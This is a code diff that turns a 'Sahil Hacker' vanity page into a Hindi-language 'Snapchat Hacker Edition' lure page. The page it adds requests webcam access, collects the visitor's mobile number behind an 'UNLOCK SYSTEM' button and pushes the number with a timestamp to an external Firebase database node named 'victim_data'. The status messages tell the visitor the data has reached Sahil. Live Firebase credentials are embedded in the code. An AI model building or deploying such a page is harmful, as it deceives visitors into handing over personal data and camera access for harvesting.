@@ -1,24 +1,62 @@
+
 <!DOCTYPE html>
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <title>Sahil Hacker Official</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Hacker Edition</title>
+    <style>
+        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        .hacker-box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; background: #050505; box-shadow: 0 0 15px #0f0; margin-top: 50px;}
+        input { padding: 12px; width: 85%; margin: 15px 0; background: #111; color: #0f0; border: 1px solid #0f0; border-radius: 5px; font-size: 16px; }
+        button { background: #0f0; color: #000; padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; width: 90%; font-size: 18px; }
+        video { width: 100%; max-width: 350px; border: 2px solid #0f0; border-radius: 10px; margin-top: 10px; }
+    </style>
 </head>
-<body style="background-color: black; color: #00FF00; text-align: center; font-family: 'Courier New', monospace; padding: 50px;">
-    
-    <marquee scrollamount="12" style="color: red; font-size: 30px; font-weight: bold;">
-        ⚠️ WARNING: SYSTEM HACKED BY SAHIL... ⚠️
-    </marquee>
-
-    <h1 style="font-size: 50px;">नमस्ते! मैं हूँ साहिल</h1>
-    <h2 style="color: white;">मिर्ज़ापुर का एथिकल हैकर</h2>
-    
-    <div style="border: 3px dashed #00FF00; padding: 30px; margin-top: 20px; display: inline-block;">
-        <p style="font-size: 20px;">[+] Status: Online</p>
-        <p style="font-size: 20px;">[+] Skill: Termux Expert</p>
-        <p style="font-size: 20px;">[+] Message: पंगा मत लेना, सिस्टम उड़ा दूँगा!</p>
+<body>
+    <div class="hacker-box">
+        <h2>SYSTEM ACCESS: SNAP-HACK</h2>
+        <p>[!] हैकर मोड एक्टिवेटेड: साहिल</p>
+        <video id="video" autoplay playsinline></video>
+        <input type="number" id="phone" placeholder="अपना मोबाइल नंबर डालें">
+        <br>
+        <button onclick="sendToSahil()">UNLOCK SYSTEM</button>
+        <p id="status" style="margin-top:15px;"></p>
     </div>
 
-    <p style="margin-top: 50px; color: gray;">&copy; 2026 Sahil Tech Labs</p>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB0XpDdnwQDD2X02QEDLkdgCHos_8YgmDs",
+            authDomain: "sahil-snap-hacker.firebaseapp.com",
+            databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com",
+            projectId: "sahil-snap-hacker",
+            storageBucket: "sahil-snap-hacker.firebasestorage.app",
+            messagingSenderId: "597030531702",
+            appId: "1:597030531702:web:8a5ba9fc3328fe8d1de557"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        const video = document.getElementById('video');
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => { video.srcObject = stream; });
+
+        window.sendToSahil = function() {
+            const phone = document.getElementById('phone').value;
+            if(phone.length < 10) { alert("सही नंबर डालो भाई!"); return; }
+            
+            push(ref(db, 'victim_data'), {
+                number: phone,
+                time: new Date().toLocaleString()
+            }).then(() => {
+                document.getElementById('status').innerText = "डाटा साहिल के पास पहुँच गया!";
+                alert("मिशन कामयाब! डाटा सेव हो गया।");
+            });
+        }
+    </script>
 </body>
 </html>
